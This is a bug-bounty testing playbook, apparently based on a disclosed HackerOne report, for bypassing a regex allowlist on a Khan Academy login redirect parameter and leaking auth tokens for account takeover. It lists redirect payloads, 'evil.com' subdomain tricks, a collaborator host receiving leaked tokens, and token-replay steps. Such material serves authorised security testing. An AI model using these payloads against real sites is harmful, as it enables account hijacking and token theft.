# Playbook: Open-Redirect Regex Dot Bypass → Token Leak ATO — 1 case per test

Target example: `https://classroom.khanacademy.org/login?continue=<URL>`
Full lesson: `2026/2026-06-20-khan-academy-regex-redirect-ato.md`
Original: https://hackerone.com/reports/3723458

Rule: 1 test at a time. Next only if previous passed.

## 0. Baseline - does param redirect?
- Payload: `?continue=https://example.com/`
- PASS if: blocked or redirected to example? Save behavior (302 Location / JS redirect). If no redirect at all, stop.

## 1. Basic open redirect?
- Payload: `?continue=https://burpcollaborator.net/`
- PASS if: Location / nextUrl points to collaborator. = open redirect. Check if `token= / key= / code=` added → that’s ATO, high severity.
- FAIL: stays on site → try bypasses below, else stop.

## 2. Allowlist? Find regex
- Fetch JS + `*.js.map`, grep `REGEX|is.*Url|trusted|DOMAIN`
- Copy regex to regex101.com. Example vulnerable: `.*-6fmjyrz2lq-uc.a.run.app$`
- Note which dots are NOT escaped (`\.` vs `.`).

## 3. Dot → dash variant (one char)
- If regex has `uc.a.run`, try `uc-a-run`, `ucXaXrun` with `X=- _ 0 a`
- Payload: `?continue=https://xfarr-6fmjyrz2lq-uc-a-run.app/`
- PASS if: passes validation (302 to your domain). = regex bypass.
- FAIL: blocked → try subdomain tricks: `evil.com?.allowed.com`, `allowed.com.evil.com`.

## 4. Token in redirect? (safe, your own account)
- Login as test victim, click your bypass link, check collaborator logs.
- PASS if: `GET /transfer_auth?key=TOKEN` arrives. = token leak.
- FAIL: redirect but no token → impact = open redirect only (lower).

## 5. Replay? (your own 2 accounts)
- In incognito, open `https://real-site/transfer_auth?key=TOKEN&continue=/`
- PASS if: cookies `KAAS/KAAL/session` set as victim. = 1-click ATO confirmed.
- Do NOT test on real victim. Your 2 test accounts enough.

## 6. Lab only: mass impact
- Check expiry, reuse, scope (student vs teacher vs admin), Referer leak.

## Notes template
```
Target: param=continue on /login
0 baseline: ...
1 evil.com: PASS/FAIL + token? y/n
2 regex found: ... unescaped at ...
3 dash-variant: PASS/FAIL
4 token leak: y/n key name=
5 replay: y/n cookies=
```
